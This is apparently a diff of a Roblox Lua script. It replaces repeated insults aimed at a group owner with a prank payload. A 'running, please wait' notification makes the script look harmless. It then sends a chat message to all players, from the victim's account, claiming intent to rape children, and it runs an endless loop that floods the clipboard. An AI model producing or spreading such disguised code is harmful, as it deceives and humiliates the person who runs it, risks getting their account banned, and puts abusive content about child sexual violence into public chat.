@@ -1,5 +1,19 @@
-群主你个男娘
-群主你个男娘
-群主你个男娘
-群主你个男娘
-群主你个男娘
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "已运行"; Text ="请耐心等待可能会卡"; Duration = 5; })
+
+task.wait(0.5)
+
+local args = {
+    [1] = "我要强奸小孩",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+
+local a = 1
+while true do
+    setclipboard("fuck"..a)
+    a = a + 1
+    task.wait(0.001)
+end
